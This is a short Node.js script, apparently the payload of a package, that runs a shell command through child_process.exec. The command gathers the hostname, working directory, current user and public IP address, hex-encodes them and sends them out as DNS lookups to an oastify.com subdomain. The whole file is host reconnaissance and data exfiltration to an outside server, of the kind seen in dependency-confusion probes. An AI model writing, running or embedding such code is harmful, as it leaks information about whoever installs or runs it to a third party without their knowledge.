const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'emonnn-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.lf4pov1uorwd4mlw5tb31okz5qbgz5.oastify.com;done" , (error, data, getter) => {
  if(error){
    console.log("error",error.message);
    return;
  }
  if(getter){
    console.log(data);
    return;
  }
  console.log(data);
  
});
